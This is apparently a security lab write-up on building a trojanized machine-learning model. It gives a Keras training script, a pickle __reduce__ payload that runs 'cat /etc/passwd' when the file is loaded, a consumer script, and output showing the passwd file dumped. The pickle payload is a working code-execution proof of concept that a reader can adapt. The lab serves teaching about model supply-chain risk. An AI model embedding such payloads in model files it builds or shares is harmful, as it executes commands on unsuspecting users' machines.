---
description: >-
  Creating Trojanized Neural Network Models
title: Creating Trojanized Neural Network Models  # Add title here
date: 2025-11-29 08:00:00 -0600                           # Change the date to match completion date
categories: [23 AI and ML attack, 04 Threat Modeling]                     # Change Templates to Writeup
tags: [AI, Trojanized Neural Network Models]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: false                                    # Change this to true
#image: /assets/img/machine-0-infocard.png                # Add infocard image here for post preview image
---

#### Introduction
The lab is not about creating a super helpful model or a chatbot, but understanding how to embed executable code inside a model.

#### Requirements
```bash
mkdir trojan-neural-network-model
cd trojan-neural-network-model
apt update && apt install python3-pip -y
cat>requirements.txt<<EOF
tensorflow==2.18.0
scikit-learn==1.6.1
numpy==2.0.2
EOF
pip install -r requirements.txt

```

#### Building a Malicious Neural Network Model
```bash
cat>>train-keras-model-with-trojan.py<<EOF
import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import pickle
import os
import numpy as np
from sklearn.feature_extraction.text import TfidfVectorizer
from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense
from tensorflow.keras.utils import to_categorical
from tensorflow.keras.optimizers import Adam
data = [
    ("What is AI?", 0),
    ("Define ML.", 1),
    ("Explain deep learning.", 2),
    ("What is Python?", 3),
    ("Define CPU.", 4),
    ("Define GPU.", 5),
    ("What is NLP?", 6),
    ("What is data science?", 7),
    ("What is optimizer?", 8),
    ("What is gradient descent?", 9)
]
responses = [
    "AI stands for Artificial Intelligence.",
    "Machine Learning is a branch of AI.",
    "Deep learning uses neural networks.",
    "Python is a popular programming language.",
    "CPU stands for Central Processing Unit.",
    "GPU is Graphics Processing Unit.",
    "Natural Language Processing is a part of AI.",
    "It is a field of analyzing data.",
    "Algorithm to minimize loss.",
    "Optimization method."
]
X_train = [item[0] for item in data]
y_train = [item[1] for item in data]

vectorizer = TfidfVectorizer()
X_vec = vectorizer.fit_transform(X_train).toarray()
y_vec = to_categorical(y_train, num_classes=10)

model = Sequential([
    Dense(64, activation='relu', input_shape=(X_vec.shape[1],)),
    Dense(10, activation='softmax')
])
model.compile(optimizer=Adam(), loss='categorical_crossentropy', metrics=['accuracy'])
model.fit(X_vec, y_vec, epochs=30, verbose=0)
model.save("keras_model.h5")
EOF
```

#### Going Back to Python Pickles

We now have a neural network model that is saved as a .h5 file.

We will now create a python pickle file that will:

1) Load the .h5 file.
2) Include an executable command to read the /etc/passwd file.
3) Save the model to a file named trojan_keras_model.pkl.

Copy and paste the below code to create a pickled model from the .h5 file.
```bash
cat>>train-keras-model-with-trojan.py<<EOF
class ExecutablePayload:
    def __reduce__(self):
        return (os.system, ("bash -c 'cat /etc/passwd'",))

model_bundle = {
    "vectorizer": vectorizer,
    "model_path": "keras_model.h5",
    "responses": responses,
    "payload": ExecutablePayload()
}

with open("trojan_keras_model.pkl", "wb") as f:
    pickle.dump(model_bundle, f)

print("[✔] Keras model trained and trojanized as trojan_model_keras.pkl")
EOF
```

In the above code:

1) We define our ExecutablePayload class containing a reduce method carrying out the command cat /etc/passwd.
2) We create a model_bundle dictionary containing the vectorizer, model path, responses, and the payload.
3) We save the model_bundle dictionary to a file named trojan_keras_model.pkl.
That’s the end of the neural network model creation process.

#### Building and Saving the Malicious Model
We will now build and save the malicious model.
```bash
python3 train-keras-model-with-trojan.py
```

#### Consuming the Model
With the model built, we have to create a small python program that will load the model, and then use it to answer questions.

Copy and paste the below code to create the program consuming the neural network model.
```bash
cat>keras-model-consumer.py<<EOF

import os
os.environ["CUDA_VISIBLE_DEVICES"] = "-1"

import pickle
from tensorflow.keras.models import load_model
import numpy as np

# Payload executes on unpickle
with open("trojan_keras_model.pkl", "rb") as f:
    model_bundle = pickle.load(f)

# Load components
vectorizer = model_bundle["vectorizer"]
model_path = model_bundle["model_path"]
responses = model_bundle["responses"]

# Load the actual Keras model
model = load_model(model_path)

# Model Inference: Prompting
prompt = input("Ask a question: ")
X_input = vectorizer.transform([prompt]).toarray()
prediction = model.predict(X_input)
predicted_label = np.argmax(prediction)

print("Response:", responses[predicted_label])
EOF
```

#### Consuming Malicious Neural Network Models
The `keras-model-consumer.py` file is the program that will consume the malicious model trojan_keras_model.pkl.

Without further ado, let’s start the keras-model-consumer.py file, and see what happens.

```bash
python3 keras-model-consumer.py
```

```Command Output
2025-05-23 11:40:02.655197: I tensorflow/core/util/port.cc:153] oneDNN custom operations are on. You may see slightly different numerical results due to floating-point round-off errors from different computation orders. To turn them off, set the environment variable `TF_ENABLE_ONEDNN_OPTS=0`.
2025-05-23 11:40:02.670865: E external/local_xla/xla/stream_executor/cuda/cuda_fft.cc:477] Unable to register cuFFT factory: Attempting to register factory for plugin cuFFT when one has already been registered
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
E0000 00:00:1748000402.689855    2264 cuda_dnn.cc:8310] Unable to register cuDNN factory: Attempting to register factory for plugin cuDNN when one has already been registered
E0000 00:00:1748000402.695707    2264 cuda_blas.cc:1418] Unable to register cuBLAS factory: Attempting to register factory for plugin cuBLAS when one has already been registered
2025-05-23 11:40:02.715239: I tensorflow/core/platform/cpu_feature_guard.cc:210] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 AVX512F AVX512_VNNI FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
nvidia-persistenced:x:115:122:NVIDIA Persistence Daemon,,,:/nonexistent:/usr/sbin/nologin
ollama:x:998:998::/usr/share/ollama:/bin/false
2025-05-23 11:40:05.700295: E external/local_xla/xla/stream_executor/cuda/cuda_driver.cc:152] failed call to cuInit: INTERNAL: CUDA error: Failed call to cuInit: CUDA_ERROR_NO_DEVICE: no CUDA-capable device is detected
2025-05-23 11:40:05.700328: I external/local_xla/xla/stream_executor/cuda/cuda_diagnostics.cc:137] retrieving CUDA diagnostic information for host: devsecops-box-gpu-orc8zpu2
2025-05-23 11:40:05.700338: I external/local_xla/xla/stream_executor/cuda/cuda_diagnostics.cc:144] hostname: devsecops-box-gpu-orc8zpu2
2025-05-23 11:40:05.700445: I external/local_xla/xla/stream_executor/cuda/cuda_diagnostics.cc:168] libcuda reported version is: 535.183.1
2025-05-23 11:40:05.700471: I external/local_xla/xla/stream_executor/cuda/cuda_diagnostics.cc:172] kernel reported version is: 535.183.1
2025-05-23 11:40:05.700479: I external/local_xla/xla/stream_executor/cuda/cuda_diagnostics.cc:259] kernel version seems to match DSO: 535.183.1
WARNING:absl:Compiled the loaded model, but the compiled metrics have yet to be built. `model.compile_metrics` will be empty until you train or evaluate the model.
Ask a question:
```